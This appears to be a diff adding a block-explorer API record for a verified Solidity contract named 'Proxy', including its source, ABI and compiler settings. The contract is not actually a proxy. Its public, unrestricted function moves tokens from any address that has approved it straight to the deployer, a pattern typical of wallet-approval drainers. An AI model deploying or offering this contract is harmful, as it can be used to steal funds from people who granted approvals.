@@ -1,0 +1,25 @@
+{
+  "TxHash": "0xd55a91f8c616596d062e5cc297175784fd86a40ea7038b420bd45f681b22e245",
+  "ContractAddress": "0x481Ec97B34F92cA8981f96EC23E7332773184e20",
+  "Name": "Proxy",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\ncontract Proxy {\r\n    address public owner;\r\n\r\n    event TransferAndForwardExecuted(address indexed from, address indexed to, uint256 amount);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transferFromAndForward(\r\n        address token,\r\n        address from,\r\n        uint256 amount\r\n    ) public {\r\n        require(token != address(0), \"Token address cannot be zero address\");\r\n        require(from != address(0), \"From address cannot be zero address\");\r\n        require(amount \u003e 0, \"Amount must be greater than zero\");\r\n\r\n        IERC20 erc20Token = IERC20(token);\r\n\r\n        // Execute transferFrom to move tokens from `from` to this contract\r\n        require(erc20Token.transferFrom(from, address(this), amount), \"transferFrom failed\");\r\n\r\n        // Forward tokens to the specified address\r\n        require(erc20Token.transfer(owner, amount), \"Forward transfer failed\");\r\n\r\n        emit TransferAndForwardExecuted(from, owner, amount);\r\n    }\r\n}",
+      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TransferAndForwardExecuted\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFromAndForward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
+      "ContractName": "Proxy",
+      "CompilerVersion": "v0.8.26+commit.8a97fa7a",
+      "OptimizationUsed": "0",
+      "Runs": "200",
+      "ConstructorArguments": "",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "MIT",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "ipfs://437e59592b736c3410ebe9ca13619ea969d1b59811d454df4c7701337d9f8e65"
+    }
+  ]
+}
